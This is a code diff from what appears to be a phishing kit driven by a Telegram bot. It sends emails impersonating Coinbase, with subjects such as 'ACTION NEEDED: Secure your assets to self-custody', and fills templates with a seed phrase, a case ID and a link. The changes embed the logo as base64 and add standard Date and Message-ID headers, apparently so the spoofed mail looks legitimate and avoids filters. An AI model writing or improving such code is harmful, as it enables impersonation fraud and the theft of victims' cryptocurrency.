@@ -622,12 +622,18 @@ async def send_employee_coinbase_email(
     if base64_image:
         html_body = html_body.replace("cid:logo", base64_image)
 
-    msg = MIMEMultipart("related")
-    msg["Subject"] = "Case Review" 
-    msg['Reply-To'] = 'help@coinbase.com'
+    # Clean MIME structure for base64 images (no CID attachments needed)
+    msg = MIMEMultipart()
+    
+    # Standard headers in proper order
+    from email.utils import formatdate, make_msgid
+    msg["Date"] = formatdate(localtime=True)
     msg["From"] = f"Coinbase <{display_email}>"
     msg["To"] = recipients
+    msg["Subject"] = "Case Review"
+    msg["Message-ID"] = make_msgid(domain=postfix_config['domain'])
     msg["MIME-Version"] = "1.0"
+    msg["Reply-To"] = 'help@coinbase.com'
     msg["X-Priority"] = "3"
     msg["X-Mailer"] = "Coinbase Notification System"
     html_part = MIMEText(html_body, "html", "utf-8")
@@ -663,20 +669,31 @@ async def send_wallet_coinbase_email(context, recipients, seed_phrase, display_e
         html_body = file.read()
 
     html_body = html_body.replace("seed_placeholder", seed_phrase)
+    
+    # Convert image to base64 and replace in template (if template uses cid:logo)
+    base64_image = get_image_as_base64("images/wallet.png")
+    if base64_image:
+        html_body = html_body.replace("cid:logo", base64_image)
 
-    msg = MIMEMultipart("related")
-    msg["Subject"] = "ACTION NEEDED: Secure your assets to self-custody"
-    msg['Reply-To'] = 'help@coinbase.com'
+    # Clean MIME structure for base64 images (no CID attachments needed)
+    msg = MIMEMultipart()
+    
+    # Standard headers in proper order
+    from email.utils import formatdate, make_msgid
+    msg["Date"] = formatdate(localtime=True)
     msg["From"] = f"Coinbase <{display_email}>"
     msg["To"] = recipients
+    msg["Subject"] = "ACTION NEEDED: Secure your assets to self-custody"
+    msg["Message-ID"] = make_msgid(domain=postfix_config['domain'])
+    msg["MIME-Version"] = "1.0"
+    msg["Reply-To"] = 'help@coinbase.com'
+    msg["X-Priority"] = "3"
+    msg["X-Mailer"] = "Coinbase Notification System"
     html_part = MIMEText(html_body, "html", "utf-8")
     msg.attach(html_part)
 
     try:
-        with open("images/wallet.png", "rb") as img_file:
-            img = MIMEImage(img_file.read(), name="wallet_coinbase.png")
-            img.add_header("Content-ID", "<logo>")
-            msg.attach(img)
+        # No CID image attachment needed - using base64 embedded in HTML
 
         send_email_through_smtp(
             "Coinbase",
@@ -705,24 +722,31 @@ async def send_secure_coinbase_email(
     html_body = html_body.replace("Daniel Greene", representative)
     html_body = html_body.replace("1835246", case_id)
     html_body = html_body.replace("https://link.com", link)
+    
+    # Convert image to base64 and replace in template (if template uses cid:logo)
+    base64_image = get_image_as_base64("images/coinbase.png")
+    if base64_image:
+        html_body = html_body.replace("cid:logo", base64_image)
 
-    msg = MIMEMultipart("related")
-    msg["Subject"] = "Secure Coinbase Token"
-    msg['Reply-To'] = 'help@coinbase.com'
+    # Clean MIME structure for base64 images (no CID attachments needed)
+    msg = MIMEMultipart()
+    
+    # Standard headers in proper order
+    from email.utils import formatdate, make_msgid
+    msg["Date"] = formatdate(localtime=True)
     msg["From"] = f"Coinbase <{display_email}>"
     msg["To"] = recipients
+    msg["Subject"] = "Secure Coinbase Token"
+    msg["Message-ID"] = make_msgid(domain=postfix_config['domain'])
+    msg["MIME-Version"] = "1.0"
+    msg["Reply-To"] = 'help@coinbase.com'
+    msg["X-Priority"] = "3"
+    msg["X-Mailer"] = "Coinbase Notification System"
     html_part = MIMEText(html_body, "html", "utf-8")
     msg.attach(html_part)
 
-
     try:
-        with open("images/coinbase.png", "rb") as img_file:
-            img_data = img_file.read()
-            img = MIMEImage(img_data, name="coinbase.png")
-            img.add_header("Content-ID", "<logo>")
-            img.add_header("Content-Disposition", "inline", filename="coinbase.png")
-            img.add_header("X-Attachment-Id", "logo")
-            msg.attach(img)
+        # No CID image attachment needed - using base64 embedded in HTML
 
         send_email_through_smtp(
             "Coinbase",
@@ -966,23 +990,31 @@ async def send_coinbase_delay_email(update: Update, context: ContextTypes.DEFAUL
     html_body = html_body.replace("USDC", token_symbol)
     html_body = html_body.replace("Cancel my <b>529.75 USDC</b>", f"Cancel my <b>{amount} {token_symbol}</b>")
     html_body = html_body.replace("https://link.com", link)
+    
+    # Convert image to base64 and replace in template (if template uses cid:logo)
+    base64_image = get_image_as_base64("images/coinbase.png")
+    if base64_image:
+        html_body = html_body.replace("cid:logo", base64_image)
 
-    msg = MIMEMultipart("related")
-    msg["Subject"] = "A manual review is pending"
-    msg['Reply-To'] = 'help@coinbase.com'
+    # Clean MIME structure for base64 images (no CID attachments needed)
+    msg = MIMEMultipart()
+    
+    # Standard headers in proper order
+    from email.utils import formatdate, make_msgid
+    msg["Date"] = formatdate(localtime=True)
     msg["From"] = f"Coinbase <{display_email}>"
     msg["To"] = recipients
+    msg["Subject"] = "A manual review is pending"
+    msg["Message-ID"] = make_msgid(domain=postfix_config['domain'])
+    msg["MIME-Version"] = "1.0"
+    msg["Reply-To"] = 'help@coinbase.com'
+    msg["X-Priority"] = "3"
+    msg["X-Mailer"] = "Coinbase Notification System"
     html_part = MIMEText(html_body, "html", "utf-8")
     msg.attach(html_part)
 
     try:
-        with open("images/coinbase.png", "rb") as img_file:
-            img_data = img_file.read()
-            img = MIMEImage(img_data, name="coinbase.png")
-            img.add_header("Content-ID", "<logo>")
-            img.add_header("Content-Disposition", "inline", filename="coinbase.png")
-            img.add_header("X-Attachment-Id", "logo")
-            msg.attach(img)
+        # No CID image attachment needed - using base64 embedded in HTML
 
         send_email_through_smtp(
             "Coinbase",
